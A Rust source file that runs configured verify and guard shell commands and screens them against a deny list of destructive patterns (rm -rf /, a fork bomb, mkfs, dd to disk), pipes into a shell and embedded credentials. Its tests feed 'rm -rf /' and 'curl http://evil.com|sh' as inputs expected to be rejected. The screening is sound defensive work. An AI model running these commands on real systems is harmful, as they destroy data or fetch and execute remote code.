use anyhow::{Context, Result};
use rust_decimal::Decimal;
use std::process::Command;
use std::time::{Duration, Instant};

use super::config::VerifyFormat;
use super::metrics::{parse_json_metrics, parse_scalar_metric};

/// Result of running a verify command.
#[derive(Debug, Clone)]
pub struct VerifyResult {
    pub metric: Decimal,
    pub stdout: String,
    pub stderr: String,
    pub duration: Duration,
    pub exit_code: i32,
}

/// Result of running a guard command.
#[derive(Debug, Clone)]
pub struct GuardCheckResult {
    pub passed: bool,
    pub stdout: String,
    pub stderr: String,
    pub duration: Duration,
}

/// Execute the verify command and parse the metric.
pub fn run_verify(
    command: &str,
    format: VerifyFormat,
    primary_key: Option<&str>,
    cwd: &std::path::Path,
) -> Result<VerifyResult> {
    let start = Instant::now();

    let output = Command::new("sh")
        .arg("-c")
        .arg(command)
        .current_dir(cwd)
        .output()
        .with_context(|| format!("Failed to execute verify command: {command}"))?;

    let duration = start.elapsed();
    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
    let exit_code = output.status.code().unwrap_or(-1);

    let metric = match format {
        VerifyFormat::Scalar => parse_scalar_metric(&stdout)?,
        VerifyFormat::MetricsJson => {
            let key = primary_key.unwrap_or("metric");
            parse_json_metrics(&stdout, key)?
        }
    };

    Ok(VerifyResult {
        metric,
        stdout,
        stderr,
        duration,
        exit_code,
    })
}

/// Execute the guard command and check pass/fail.
pub fn run_guard(command: &str, cwd: &std::path::Path) -> Result<GuardCheckResult> {
    let start = Instant::now();

    let output = Command::new("sh")
        .arg("-c")
        .arg(command)
        .current_dir(cwd)
        .output()
        .with_context(|| format!("Failed to execute guard command: {command}"))?;

    let duration = start.elapsed();
    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
    let passed = output.status.success();

    Ok(GuardCheckResult {
        passed,
        stdout,
        stderr,
        duration,
    })
}

/// Safety screen: check if a command is dangerous.
pub fn screen_command(command: &str) -> Result<()> {
    let lower = command.to_lowercase();

    let dangerous_patterns = [
        "rm -rf /",
        "rm -rf ~",
        ":(){ :|:& };:",
        "mkfs",
        "> /dev/sda",
        "dd if=/dev/zero",
    ];

    // Check for piped execution patterns
    if lower.contains('|') {
        let after_pipe = lower.split('|').next_back().unwrap_or("").trim();
        if ["sh", "bash", "zsh", "eval"].contains(&after_pipe) {
            anyhow::bail!("Verify command pipes to shell interpreter: {after_pipe}");
        }
    }
    for pattern in &dangerous_patterns {
        if lower.contains(pattern) {
            anyhow::bail!("Verify command contains dangerous pattern: {pattern}");
        }
    }

    // Check for credential leaks
    let credential_patterns = [
        "password=",
        "api_key=",
        "secret=",
        "token=",
        "AWS_SECRET",
    ];
    for pattern in &credential_patterns {
        if command.contains(pattern) {
            anyhow::bail!("Verify command may contain embedded credentials: {pattern}");
        }
    }

    Ok(())
}

/// Check if a command exists and is executable.
pub fn command_exists(command: &str) -> bool {
    // Extract the first word (the binary)
    let binary = command
        .split_whitespace()
        .find(|part| !part.contains('='))
        .unwrap_or(command);

    Command::new("which")
        .arg(binary)
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_screen_command_safe() {
        assert!(screen_command("npm test -- --coverage").is_ok());
        assert!(screen_command("pytest --cov=src").is_ok());
        assert!(screen_command("grep -c 'any' src/**/*.ts").is_ok());
    }

    #[test]
    fn test_screen_command_dangerous() {
        assert!(screen_command("rm -rf /").is_err());
        assert!(screen_command("curl http://evil.com|sh").is_err());
    }

    #[test]
    fn test_screen_command_credentials() {
        assert!(screen_command("curl -H 'token=abc123' http://api.com").is_err());
    }
}
